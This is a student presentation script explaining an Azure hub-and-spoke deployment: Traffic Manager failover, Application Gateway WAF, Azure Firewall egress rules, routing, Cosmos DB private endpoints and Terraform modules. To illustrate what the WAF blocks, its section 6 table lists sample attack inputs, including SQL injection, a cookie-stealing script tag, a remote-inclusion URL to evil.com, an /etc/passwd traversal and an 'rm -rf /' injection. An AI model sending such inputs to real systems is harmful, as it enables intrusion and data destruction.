# Full Presentation Script — Azure Hub-and-Spoke Global Architecture

> This is your complete spoken script. Study it section by section. Each section maps to a slide or topic in your presentation. Key terms are **bolded** for emphasis while speaking.

---

## 1. Project Goal

> **Script:**

"Our project goal was to find out how we can **design and implement a highly available, secure, and fault-tolerant cloud infrastructure** for the workloads we are trying to run.

We had two web applications — a **Fitness Tracker** and an **Organic Ghee e-commerce store** — and we needed to ensure that if any single component fails — whether it's a server, a region, or even an entire data center — our users would never experience downtime. At the same time, every byte of traffic entering and leaving our infrastructure had to be inspected and secured against modern web attacks."

---

## 2. Project Description

> **Script:**

"To achieve this, we implemented a **globally distributed Hub-and-Spoke network topology** on **Microsoft Azure**. Our architecture spans **two geographic regions** — **Central India** as our primary and **East US 2** as our disaster recovery site.

The architecture securely hosts our web applications using **global DNS-based load balancing** via Traffic Manager, **Web Application Firewalls** for L7 protection, **centralized network inspection** through Azure Firewall for L3/L4 protection, and **auto-scaling compute resources** using Virtual Machine Scale Sets to provide both resilience and elasticity."

---

## 3. Why Hub-and-Spoke Architecture?

> **Script:**

"Now, let me explain **why we chose the Hub-and-Spoke model** over other architectures like a flat network or a mesh topology.

In a **flat network**, every VNet would need its own firewall, its own security appliances, and its own management plane. That's expensive and hard to maintain. In a **mesh topology**, every VNet is peered with every other VNet — which gives you N-squared complexity. For 3 VNets that's 6 peerings, but for 10 VNets that's 90 peerings. It doesn't scale.

The **Hub-and-Spoke model** gives us the best of both worlds:

1. **Centralized Security** — We deploy our expensive security appliances (Azure Firewall, Bastion) only once in the Hub. All traffic must pass through the Hub, giving us a single choke-point for inspection.
2. **Workload Isolation** — Each Spoke VNet is completely isolated. Our Fitness Tracker in Spoke 1 cannot directly talk to our Organic Ghee in Spoke 2 unless the Hub explicitly allows it.
3. **Cost Efficiency** — We share the Firewall and Bastion across all spokes, instead of deploying one per workload.
4. **Scalability** — Adding a new application is as simple as creating a new Spoke VNet and peering it to the Hub."

> **Pointer to remember:**
> - Hub = Security & shared services
> - Spoke = Isolated application workloads
> - Communication between Spokes is always via the Hub

---

## 4. Architecture Layout

> **Script:**

"Let me walk you through how we laid out our architecture.

**The Hub VNet** is deployed in **Central India** with the CIDR range `10.0.0.0/16`. It contains:
- The **AzureFirewallSubnet** (`10.0.10.0/24`) — hosting our Azure Firewall
- The **AzureBastionSubnet** (`10.0.20.0/24`) — hosting Azure Bastion for secure SSH access to VMs without exposing them to the internet

**Spoke 1 VNet** is also in **Central India** with CIDR `10.1.0.0/16`. It contains:
- **VMSS-APP-SUBNET** (`10.1.10.0/24`) — where our application VMs run
- **AppGatewaySubnet** (`10.1.20.0/24`) — hosting the Application Gateway with WAF
- **PrivateEndpointSubnet** (`10.1.30.0/24`) — hosting the Cosmos DB private endpoint

**Spoke 2 VNet** is in **East US 2** with CIDR `10.2.0.0/16`, and it mirrors the exact same subnet structure as Spoke 1 for disaster recovery.

Both Spokes are **peered to the Hub** with `allow_forwarded_traffic = true`, which means traffic can be forwarded through the Hub's firewall. The Spokes are **NOT peered to each other** — all inter-spoke communication must go through the Hub."

---

## 5. Azure Traffic Manager — Why Not Azure Front Door?

> **Script:**

"For global load balancing, we chose **Azure Traffic Manager** over **Azure Front Door**. Let me explain why.

### What is Traffic Manager?
Traffic Manager is a **DNS-based global load balancer**. It operates at the **DNS level** — when a user types `organic-ghee-tm.trafficmanager.net`, Traffic Manager resolves the DNS query to the IP address of the healthiest endpoint. It does NOT proxy the actual HTTP traffic. The user's browser connects directly to the Application Gateway's public IP.

### What is Azure Front Door?
Azure Front Door is a **Layer 7 global load balancer** that actually **proxies** all HTTP/HTTPS traffic through Microsoft's edge network. It sits in between the user and your backend.

### Why did we choose Traffic Manager over Front Door?

| Aspect | Traffic Manager | Azure Front Door |
|---|---|---|
| **Layer** | DNS (Layer 3) | HTTP/HTTPS (Layer 7) |
| **Traffic flow** | DNS resolution only; user connects directly to backend | All traffic proxied through Microsoft's edge |
| **Cost** | ~₹75/month (very cheap) | ₹2,500+/month (per routing rule + data transfer) |
| **SSL Termination** | No (handled by App Gateway) | Yes (at the edge) |
| **Caching/CDN** | No | Yes, built-in |
| **WAF** | No (we use App Gateway WAF) | Yes, built-in |

We chose Traffic Manager because:
1. **We already have WAF on our Application Gateways** — we don't need Front Door's WAF, so we'd be paying double for the same protection.
2. **Cost** — Traffic Manager costs a fraction of Front Door. For a student project, this makes a massive difference.
3. **Simplicity** — We just need DNS-based failover, not L7 content routing.

### How does our Traffic Manager work?
We configured **Priority Routing**:
- **Priority 1 (Primary):** Points to the Application Gateway public IP in **Central India**
- **Priority 2 (Secondary):** Points to the Application Gateway public IP in **East US 2**

Traffic Manager continuously sends **HTTP health probes** to the `/` path of both Application Gateways every **30 seconds** with a **10-second timeout**. If the primary endpoint fails 3 consecutive health checks, Traffic Manager automatically updates the DNS to point to the secondary endpoint. Users get redirected to the DR site.

### Disadvantages of Traffic Manager:
1. **DNS TTL Delay** — We set TTL to 100 seconds. So after a failover, some users may still hit the dead primary for up to 100 seconds because of cached DNS.
2. **No L7 intelligence** — It can't do URL path-based routing or header-based routing like Front Door.
3. **No caching** — It's not a CDN, so it can't accelerate content delivery."

> **Pointer to remember:**
> - Traffic Manager = DNS level, cheap, simple failover
> - Front Door = L7 proxy, expensive, has CDN + WAF built-in
> - We chose TM because we already have App Gateway WAF and don't need double WAF

---

## 6. Application Gateway — How It Works & WAF Security

> **Script:**

"Now let's talk about the **Application Gateway v2** and how it provides security.

### What is Application Gateway?
Application Gateway is an **L7 (Layer 7) reverse proxy and load balancer**. Unlike a traditional load balancer that works at L4 (TCP/UDP), Application Gateway understands **HTTP/HTTPS**. It can inspect the URL, headers, cookies, and body of every request.

### How does it work in our architecture?
We deployed one Application Gateway in each Spoke. Each App Gateway has:
- A **single public IP** shared by both applications
- **Two HTTP listeners** — one for `organic-ghee-tm.trafficmanager.net` and one for `fitness-tracker-tm.trafficmanager.net`
- **Host-based routing** — when a request comes in, the App Gateway checks the `Host` header and routes it to the correct backend pool

So when a user visits `organic-ghee-tm.trafficmanager.net`:
1. Traffic Manager resolves DNS to the App Gateway's public IP
2. The browser sends an HTTP request with `Host: organic-ghee-tm.trafficmanager.net`
3. The App Gateway matches this to `listener-ghee`
4. The listener routes it to `pool-ghee` backend pool
5. The request reaches the Organic Ghee VMSS instances

### WAF v2 — Web Application Firewall
We enabled **WAF in Prevention mode** using the **OWASP 3.2 Core Rule Set (CRS)**.

**Prevention mode** means the WAF **actively blocks** malicious requests. In Detection mode, it would only log them but still let them through.

**What does OWASP 3.2 CRS block?**

| Attack Type | What It Is | How WAF Blocks It |
|---|---|---|
| **SQL Injection (SQLi)** | Attacker sends `'; DROP TABLE users;--` in a form field to manipulate your database | WAF detects SQL syntax patterns in request parameters and blocks the request |
| **Cross-Site Scripting (XSS)** | Attacker injects `<script>steal_cookies()</script>` into a form to run JavaScript in other users' browsers | WAF detects `<script>` tags and JavaScript event handlers in input fields |
| **Remote File Inclusion (RFI)** | Attacker tries to include a remote malicious script via URL parameters like `?page=http://evil.com/shell.php` | WAF detects URLs in parameter values that reference external resources |
| **Local File Inclusion (LFI)** | Attacker uses `../../etc/passwd` in the URL to read server files | WAF detects directory traversal patterns (`../`) |
| **Command Injection** | Attacker sends `; rm -rf /` in a form field to execute OS commands | WAF detects shell metacharacters (`;`, `|`, `` ` ``) |
| **Protocol Violations** | Malformed HTTP headers, missing `Content-Type`, oversized requests | WAF enforces HTTP protocol compliance (we set max body size to 128KB) |

**Key configuration in our setup:**
- Request body check: **Enabled** (inspects POST data, not just URL)
- Max file upload: **100 MB**
- Max request body size: **128 KB** (anything larger gets blocked)

### Health Probes
Each App Gateway has custom health probes that check the `/` path of both apps every **30 seconds**. If a VM stops responding, the App Gateway pulls it out of the backend pool rotation within **90 seconds** (3 failed checks × 30 seconds)."

> **Pointer to remember:**
> - App Gateway = L7, understands HTTP, does host-based routing
> - WAF v2 Prevention mode with OWASP 3.2
> - Blocks: SQLi, XSS, RFI, LFI, Command Injection, Protocol Violations
> - Health probes auto-remove unhealthy VMs

---

## 7. Azure Firewall — Rules and Protection

> **Script:**

"The **Azure Firewall** is deployed in the Hub VNet and acts as the **central security enforcement point** for all traffic entering and leaving our Spokes.

### What Layer does Azure Firewall operate at?
Azure Firewall operates at **Layer 3/4 (Network Rules)** and **Layer 7 (Application Rules)**:
- **Network Rules (L3/L4):** Filter traffic based on source IP, destination IP, port, and protocol (TCP/UDP). These are processed first.
- **Application Rules (L7):** Filter outbound HTTP/HTTPS traffic based on **FQDNs** (Fully Qualified Domain Names). These let you say 'allow traffic to github.com but block everything else.'

### What rules did we configure?

**Network Rules (L3/L4):**

| Rule Name | Source | Destination | Port | Purpose |
|---|---|---|---|---|
| `Allow-CosmosDB` | All spokes (`10.0-2.0.0/16`) | `AzureCosmosDB` service tag | `443`, `10255` | Allow VMSS to reach Cosmos DB via Private Endpoint |
| `Allow-DNS` | All spokes | `168.63.129.16` | `53 (UDP)` | Allow DNS resolution via Azure's internal DNS |
| `Allow-AppGW-to-VMSS` | All spokes | All spokes | `80`, `10255` | Allow HTTP traffic from App Gateway to VMSS, and internal PE communication |

**Application Rules (L7):**

| Rule Name | Target FQDNs | Protocol | Purpose |
|---|---|---|---|
| `Allow-OS-Updates` | `*.ubuntu.com` | HTTP/HTTPS | Allow Ubuntu package updates |
| `Allow-Node-Deps` | `*.npmjs.com`, `*.npmjs.org`, `registry.npmjs.org`, `*.nodesource.com` | HTTPS | Allow npm package installations |
| `Allow-Git-Clone` | `github.com`, `*.github.com`, `*.githubusercontent.com` | HTTPS | Allow cloning repos from GitHub |

**Everything else is DENIED by default.** If a VM tries to reach `facebook.com` or any unauthorized domain — it gets blocked. This is a **zero-trust egress model**.

### What does this protect against?
1. **Data Exfiltration** — If an attacker compromises a VM, they cannot send stolen data to an external server because outbound traffic is restricted.
2. **Command & Control (C2)** — Malware on the VM cannot call home to receive instructions because only whitelisted domains are allowed.
3. **Lateral Movement** — The firewall controls inter-spoke traffic, so compromising one app doesn't give access to another.
4. **Unauthorized Downloads** — VMs can't download unauthorized tools or backdoors."

> **Pointer to remember:**
> - Azure Firewall = L3/L4 (Network Rules) + L7 (Application Rules)
> - Default action: DENY ALL
> - Only whitelisted FQDNs allowed outbound
> - Protects against: data exfiltration, C2, lateral movement

---

## 8. Route Tables — How Traffic Flows

> **Script:**

"Now let me explain the **User Defined Routes (UDRs)** and how traffic actually flows through our network.

By default, Azure creates **system routes** that allow subnets within the same VNet to talk directly. But we **don't want that**. We want ALL traffic to be inspected by the Firewall. So we created custom route tables.

### VMSS Subnet Route Table (`rt-vmss-*`):

| Route Name | Address Prefix | Next Hop | What it does |
|---|---|---|---|
| `To-Hub-Firewall` | `0.0.0.0/0` | Firewall Private IP | Forces ALL outbound internet traffic through the firewall |
| `return-to-appgw-via-fw` | `10.1.20.0/24` (AppGW subnet) | Firewall Private IP | Forces return traffic from VMSS to App Gateway through the firewall to prevent asymmetric routing |

### App Gateway Subnet Route Table (`rt-appgw-*`):

| Route Name | Address Prefix | Next Hop | What it does |
|---|---|---|---|
| `route-to-vmss-via-fw` | `10.1.10.0/24` (VMSS subnet) | Firewall Private IP | Forces traffic from App Gateway to VMSS through the firewall |

### Why the 'return-to-appgw-via-fw' route?
This prevents **asymmetric routing**. Here's what would happen without it:
1. User request → App Gateway → Firewall → VMSS ✅ (inspected)
2. VMSS response → App Gateway directly (bypasses firewall) ❌

This is called asymmetric routing — the request goes one path, the response goes another. Azure Firewall is **stateful**, meaning it tracks connections. If it sees a response without ever seeing the original request, it drops it. So we MUST send return traffic back through the firewall.

### Complete Request Flow:
```
User → DNS (Traffic Manager) → App Gateway Public IP
     → App Gateway (WAF inspection - L7)
     → UDR forces to Azure Firewall (L3/L4 inspection)
     → Azure Firewall allows and forwards to VMSS
     → VMSS processes request
     → Response: VMSS → UDR to Firewall → Firewall → App Gateway → User
```"

> **Pointer to remember:**
> - `0.0.0.0/0` → Firewall = all internet traffic goes through FW
> - Return route prevents asymmetric routing
> - Firewall is stateful — it must see both request AND response

---

## 9. Outbound Internet Access — How Does It Work Without Public IPs?

> **Script:**

"A great question that might come up: **Our VMs don't have public IP addresses, so how do they access the internet?** For example, during bootstrapping, they need to run `apt-get update`, `git clone`, and `npm install`.

The answer is **SNAT (Source Network Address Translation)** through the Azure Firewall.

Here's how it works:
1. The VM sends an outbound request (e.g., to `github.com`)
2. The UDR on the VMSS subnet sends this to the **Firewall's private IP**
3. The Firewall checks its Application Rules — `github.com` is whitelisted ✅
4. The Firewall performs **SNAT** — it replaces the VM's private source IP (`10.1.10.x`) with the **Firewall's own public IP** (`pip-fw`)
5. The response from GitHub comes back to the Firewall's public IP
6. The Firewall performs **reverse SNAT** — maps it back to the VM's private IP and forwards it

This is similar to how your home router works — all your devices share one public IP.

### Will we face Port Exhaustion (SNAT Port Exhaustion)?
Each Azure Firewall public IP provides **2,048 SNAT ports** per destination IP. With just 4 VMs (our max scale), and traffic going to only a few destinations (GitHub, npm, Ubuntu repos), we are **nowhere near exhaustion**.

Port exhaustion becomes a concern when you have **hundreds of VMs** all connecting to the **same destination** simultaneously. In that case, you'd add more public IPs to the Firewall (Azure supports up to 250 public IPs per firewall, giving you 250 × 2,048 = 512,000 SNAT ports).

For our setup, this is **not a concern at all**."

> **Pointer to remember:**
> - No public IP on VMs → traffic goes through Firewall via UDR
> - Firewall does SNAT using its own public IP
> - 2,048 SNAT ports per public IP per destination
> - Port exhaustion NOT a concern for our scale (4 VMs max)

---

## 10. How the Correct VM Gets the Correct Request

> **Script:**

"We have **4 separate VMSS clusters** running on the same subnet. So how does the right request reach the right VM?

The answer is the **Application Gateway's host-based routing**.

Each App Gateway has:
- **Two listeners** — `listener-ghee` (matches `Host: organic-ghee-tm.trafficmanager.net`) and `listener-fitness` (matches `Host: fitness-tracker-tm.trafficmanager.net`)
- **Two backend pools** — `pool-ghee` (contains Ghee VMSS instances) and `pool-fitness` (contains Fitness VMSS instances)
- **Routing rules** that map each listener to its correct backend pool

So the flow is:
1. Request arrives at App Gateway's public IP
2. App Gateway reads the `Host` header
3. If `Host = organic-ghee-tm.trafficmanager.net` → routes to `pool-ghee` → reaches Ghee VMSS
4. If `Host = fitness-tracker-tm.trafficmanager.net` → routes to `pool-fitness` → reaches Fitness VMSS

The VMs themselves are registered in the correct backend pool via Terraform — when we create the VMSS, we pass `application_gateway_backend_address_pool_ids` which automatically registers all instances in that VMSS into the correct backend pool."

---

## 11. Disaster Recovery — How It Works

> **Script:**

"Our disaster recovery strategy is **Active-Passive** across two regions.

**Normal Operation:**
- All traffic goes to Central India (Priority 1 in Traffic Manager)
- East US 2 is running but receives zero traffic (standby)

**When Central India fails:**
1. Traffic Manager health probe to Central India's App Gateway fails (3 consecutive failures × 30 second intervals = **90 seconds to detect**)
2. Traffic Manager updates DNS to resolve to East US 2's App Gateway IP
3. Users' DNS caches expire after the **TTL (100 seconds)**
4. New requests go to East US 2

**Total failover time: approximately 3-4 minutes** (90s detection + 100s DNS TTL)

**Why is East US 2 ready?**
- The App Gateway, VMSS, and application code are **identical** (deployed from the same Terraform modules)
- Cosmos DB is **natively replicated** between both regions — the data is already there
- The VMs bootstrap themselves using Cloud-Init, so they're running the same code with the same DB connection

**When Central India recovers:**
Traffic Manager detects the primary is healthy again and automatically switches traffic back. This is called **failback**."

---

## 12. Database — Cosmos DB with Private Endpoints

> **Script:**

"For our database, we used **Azure Cosmos DB for MongoDB**, API version **4.2**.

### Why Cosmos DB?
1. **Global Distribution** — Cosmos DB can natively replicate data across multiple Azure regions. We configured it with **Central India as the primary write region** and **East US 2 as the secondary read replica**. If Central India goes down, Azure automatically promotes East US 2 to the primary.
2. **MongoDB Compatibility** — Both our applications were built using **Mongoose** (a Node.js MongoDB ODM). Cosmos DB's MongoDB API means we didn't need to change a single line of application code — it speaks the same MongoDB wire protocol on port **10255**.
3. **Managed Service** — No patching, no backups to manage, no replica set configuration. Azure handles everything.

### Consistency Level
We chose **Session consistency** — this means within a single user session, you're guaranteed to read your own writes. It's the most popular choice because it balances performance with consistency.

### Private Endpoints — How They Work

Our Cosmos DB has **zero public internet exposure**. It's accessible only through **Private Endpoints**.

**What is a Private Endpoint?**
A Private Endpoint is a **network interface** (NIC) deployed inside your VNet subnet that gets a **private IP address** (e.g., `10.1.30.4`). This NIC is connected to the Cosmos DB service via Azure's internal **Private Link** backbone.

**Why a separate subnet (`PrivateEndpointSubnet`)?**
1. **NSG Granularity** — We can apply different Network Security Group rules to the PE subnet vs the VMSS subnet
2. **Route Table Isolation** — The PE subnet doesn't need the `0.0.0.0/0 → Firewall` route (the PE itself doesn't make outbound calls)
3. **Best Practice** — Microsoft recommends dedicating a subnet for Private Endpoints

**How does our app communicate with the database?**

1. The VMSS instance's code calls `mongoose.connect('mongodb://cosmos-mongodb-global.mongo.cosmos.azure.com:10255/...')`
2. The VM's DNS resolver queries Azure DNS (`168.63.129.16`)
3. Azure DNS checks the **Private DNS Zone** (`privatelink.mongo.cosmos.azure.com`) linked to our VNet
4. It resolves `cosmos-mongodb-global.mongo.cosmos.azure.com` → CNAME → `cosmos-mongodb-global.privatelink.mongo.cosmos.azure.com` → Private IP (`10.1.30.x`)
5. The VM connects directly to `10.1.30.x` over the **Azure private backbone** — the traffic **NEVER leaves Microsoft's network** and **NEVER touches the public internet**

This gives us:
- **Lower latency** — private backbone is faster than public internet
- **Zero exposure** — even if someone discovers the Cosmos DB hostname, they can't connect from outside our VNet
- **Compliance** — sensitive data never traverses the public internet"

> **Pointer to remember:**
> - Cosmos DB = MongoDB API, globally replicated, managed service
> - Private Endpoint = NIC with private IP in our VNet, connected via Private Link
> - DNS flow: hostname → Private DNS Zone → private IP
> - Traffic uses Azure private backbone, never public internet

---

## 13. Compute — VMSS and Autoscaling

> **Script:**

"We use **Virtual Machine Scale Sets (VMSS)** for our compute layer. We have 4 independent VMSS clusters:
- `vmss-spoke1-ghee` and `vmss-spoke1-fitness` in Central India
- `vmss-spoke2-ghee` and `vmss-spoke2-fitness` in East US 2

**VM Configuration:**
- **SKU:** `Standard_D2s_v3` (2 vCPUs, 8 GB RAM)
- **OS:** Ubuntu 20.04 LTS
- **Default instances:** 1 per VMSS
- **Max instances:** 2 per VMSS

**Autoscaling Rules:**
- **Scale OUT** (add instance): When average CPU > **60%** for 6 minutes
- **Scale IN** (remove instance): When average CPU < **40%** for 6 minutes
- **Cooldown period:** 5 minutes (prevents rapid scaling oscillation)

**Cloud-Init Bootstrapping:**
Each VM uses a `custom_data` script (Cloud-Init) that runs on first boot and automatically:
1. Installs Node.js 20.x, PM2 (process manager), and Nginx
2. Clones the application code from GitHub
3. Runs `npm install`
4. Injects the Cosmos DB connection string (passed by Terraform)
5. Starts the Node.js app via PM2 (which auto-restarts on crash)
6. Configures Nginx as a reverse proxy on port 80

This means **zero manual SSH access is needed** to deploy the application."

---

## 14. Costing Overview

> **Script:**

"Let me give you a rough cost breakdown of the major components:

| Component | Quantity | Estimated Monthly Cost (INR) |
|---|---|---|
| **Azure Firewall** (Standard) | 1 | ₹55,000 – ₹65,000 |
| **Application Gateway** (WAF_v2, 2 capacity units) | 2 | ₹25,000 – ₹30,000 each |
| **VMSS** (Standard_D2s_v3) | 4 instances (1 each) | ₹5,500 – ₹6,500 each |
| **Cosmos DB** (Session, 2 regions) | 1 account | ₹3,000 – ₹8,000 (depends on RUs) |
| **Traffic Manager** | 2 profiles | ₹75 – ₹150 each |
| **Azure Bastion** (Basic) | 1 | ₹9,000 – ₹10,000 |
| **Public IPs** (Standard SKU) | ~5 | ₹300 each |
| **Private Endpoints** | 2 | ₹500 each |

**Total estimated: ₹1,35,000 – ₹1,70,000/month**

The **Azure Firewall alone accounts for ~40%** of the total cost. In a production environment, organizations would justify this cost because the security and centralized inspection it provides would otherwise require multiple third-party appliances.

Traffic Manager is by far the cheapest component — just ₹75/month for global DNS-based failover. This is why we chose it over Azure Front Door (which starts at ₹2,500+/month)."

> **Pointer to remember:**
> - Firewall is the most expensive component (~₹60K/month)
> - Traffic Manager is the cheapest (~₹75/month)
> - Total infra cost: ~₹1.5 lakh/month

---

## 15. Terraform — Modular Infrastructure as Code

> **Script:**

"Our entire infrastructure is defined in **Terraform** using a **modular architecture**. Let me explain how it works.

### What is Terraform?
Terraform is an **Infrastructure as Code (IaC)** tool by HashiCorp. You write `.tf` files describing your desired infrastructure state, and Terraform figures out what Azure API calls to make to create, update, or delete resources to match that state.

### Our Module Structure

```
infrastructure/
├── main.tf              # Root module — orchestrates everything
├── variables.tf         # Input parameters (regions, CIDRs)
├── outputs.tf           # Output values (URLs, CNAME records)
├── scripts/
│   ├── bootstrap_ghee.sh.tftpl      # Cloud-init for Organic Ghee VMs
│   └── bootstrap_fitness.sh.tftpl   # Cloud-init for Fitness Tracker VMs
└── modules/
    ├── network_hub/      # Hub VNet, Firewall, Bastion
    ├── network_spoke/    # Spoke VNets, Subnets, UDRs, NSGs, Peerings
    ├── security_rules/   # Firewall Network + Application Rules
    ├── gateway_app/      # Application Gateway, WAF, Listeners, Backend Pools
    ├── compute_vmss/     # VMSS, Autoscale Settings
    └── database/         # Cosmos DB, Private Endpoints, Private DNS Zone
```

### How Modules Work
A module is a **reusable building block**. For example, `network_spoke` is called **twice** — once for Central India and once for East US 2. The only things that change are the **input variables**:

```hcl
module \"network_spoke1\" {
  source    = \"./modules/network_spoke\"
  vnet_name = \"vnet-spoke1\"
  vnet_cidr = \"10.1.0.0/16\"
  location  = \"centralindia\"
  ...
}

module \"network_spoke2\" {
  source    = \"./modules/network_spoke\"
  vnet_name = \"vnet-spoke2\"
  vnet_cidr = \"10.2.0.0/16\"
  location  = \"eastus2\"
  ...
}
```

Same module, same code, different parameters. This eliminates code duplication.

### How Values Are Injected
Terraform modules communicate through **inputs (variables)** and **outputs**.

For example:
1. The `network_hub` module creates the Firewall and **outputs** its private IP: `output \"firewall_private_ip\"`
2. The `network_spoke` module **takes that as input** to configure UDRs: `firewall_private_ip = module.network_hub.firewall_private_ip`
3. The `database` module creates Cosmos DB and **outputs** the connection string
4. The `compute_vmss` module uses `templatefile()` to inject that connection string into the Cloud-Init bootstrap script

### Dynamic Value Injection — The `templatefile()` Function
This is one of the most powerful features we used:

```hcl
bootstrap_script = base64encode(templatefile(
  \"scripts/bootstrap_ghee.sh.tftpl\",
  { MONGODB_URI = replace(
      module.database.connection_string,
      \"/?ssl=true\",
      \"/restaurant?ssl=true\"
    )
  }
))
```

What this does:
1. Gets the Cosmos DB connection string from the database module output
2. Uses `replace()` to inject the database name (`restaurant`) into the correct position in the URL
3. Passes this into the `.tftpl` template file which contains `${MONGODB_URI}` placeholders
4. Terraform replaces the placeholders with the actual value
5. The whole script is then `base64encode()`-ed because Azure's `custom_data` requires base64

### State Management
Terraform stores the current state of all resources in `terraform.tfstate`. This allows it to:
- Know what already exists (so it doesn't recreate things)
- Detect drift (if someone manually changed something in Azure Portal)
- Plan changes accurately (show you exactly what will be created/modified/destroyed)

### Total Automation
Because everything is codified:
```powershell
terraform destroy -auto-approve   # Deletes EVERYTHING in minutes
terraform apply -auto-approve     # Recreates EVERYTHING from scratch
```

No manual clicks in Azure Portal. No forgotten configurations. No documentation drift. The Terraform code IS the documentation."

> **Pointer to remember:**
> - 6 modules, each responsible for one concern
> - Modules are reusable (spoke module used twice)
> - Values flow: outputs of one module → inputs of another
> - `templatefile()` + `replace()` for dynamic connection string injection
> - `terraform destroy` + `terraform apply` = full infra lifecycle

---

## 16. Conclusion

> **Script:**

"To summarize what we achieved:

1. **High Availability** — Multi-region deployment with automatic DNS failover via Traffic Manager. No single point of failure.
2. **Security** — Defense in depth with three layers:
   - **L7 (Application):** WAF v2 with OWASP 3.2 blocking SQLi, XSS, RFI, LFI, and more
   - **L3/L4 (Network):** Azure Firewall with zero-trust egress and deep packet inspection
   - **Network Isolation:** Private Endpoints ensuring database traffic never touches the public internet
3. **Fault Tolerance** — VMSS autoscaling handles traffic spikes, App Gateway health probes remove unhealthy VMs, and Cosmos DB automatically replicates data across regions
4. **Operational Efficiency** — 100% Infrastructure as Code with Terraform modules. The entire global infrastructure can be destroyed and recreated in under 10 minutes with a single command.

Thank you. We're now open to questions."

---

## Quick-Fire Q&A Prep

> Study these in case they come up as questions:

**Q: Why not use Azure Load Balancer instead of Application Gateway?**
A: Azure Load Balancer is L4 — it doesn't understand HTTP. We need host-based routing (two apps on one IP) and WAF, which only Application Gateway provides.

**Q: What happens if the Firewall itself goes down?**
A: Azure Firewall has a built-in SLA of 99.95% uptime. It's deployed across Availability Zones internally by Azure. If it goes down, ALL traffic stops — it's a single point of failure by design (the security choke-point).

**Q: Why didn't you use AKS (Kubernetes)?**
A: Our applications are simple Node.js apps. Kubernetes adds significant operational complexity (pod management, ingress controllers, service meshes) that isn't justified for two simple web apps. VMSS gives us autoscaling with much less overhead.

**Q: How do you SSH into VMs for debugging?**
A: Through **Azure Bastion** in the Hub VNet. Bastion provides browser-based SSH access without exposing any SSH ports to the internet. No need for jump boxes or VPN.

**Q: Why two separate VMSS per app instead of one shared VMSS?**
A: Resource isolation. If the Organic Ghee app has a memory leak and crashes, it doesn't affect the Fitness Tracker VMs. Each app scales independently based on its own CPU metrics.

**Q: What if Cosmos DB's primary region fails?**
A: Cosmos DB has automatic failover. East US 2 (failover priority 1) gets promoted to the write region automatically. Our app's connection string uses the global endpoint which Azure redirects transparently.
